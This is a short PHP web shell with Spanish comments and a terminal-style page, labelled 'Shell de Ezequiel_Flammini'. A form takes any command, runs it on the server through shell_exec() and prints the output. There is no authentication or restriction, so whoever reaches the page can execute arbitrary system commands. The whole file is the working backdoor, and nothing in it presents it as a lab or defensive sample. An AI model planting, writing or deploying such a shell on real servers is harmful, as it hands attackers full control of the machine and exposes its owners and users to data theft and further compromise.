<!DOCTYPE html>
<html>
<head>
    <title>Shell de [Ezequiel_Flammini]</title>
    <style>
        /* Un poco de estilo para que se vea como una terminal */
        body { background-color: #1e1e1e; color: #dcdcdc; font-family: 'Courier New', Courier, monospace; }
        .container { width: 80%; margin: 20px auto; }
        input[type="text"] { background-color: #333; color: #dcdcdc; border: 1px solid #555; padding: 5px; width: 80%; }
        input[type="submit"] { background-color: #555; color: #dcdcdc; border: none; padding: 5px 10px; }
        pre { background-color: #000; padding: 15px; border: 1px solid #555; white-space: pre-wrap; word-wrap: break-word; }
    </style>
</head>
<body>
    <div class="container">
        <h5>Shell de Ezequiel_Flammini</h5>
                  <h5>EZE-UGR</h5>

        <form method="POST">
            <label for="cmd">Comando</label>
            <input type="text" name="comando" id="cmd" autofocus>
            <input type="submit" value="Ejecutar">
        </form>
        <hr>

        <?php
            // Revisa si se envió un comando a través del formulario (método POST)
            if (isset($_POST['comando'])) {
                // Obtiene el comando de forma segura para mostrar
                $cmd = $_POST['comando'];
                echo "<h3>Resultado de: " . htmlspecialchars($cmd) . "</h3>";

                // Ejecuta el comando y captura la salida
                // shell_exec() es una buena opción para esto
                $resultado = shell_exec($cmd);

                // Muestra el resultado del comando
                // Usamos <pre> para que respete los saltos de línea y espacios
                echo "<pre>" . htmlspecialchars($resultado) . "</pre>";
            }
        ?>
    </div>
</body>
</html>
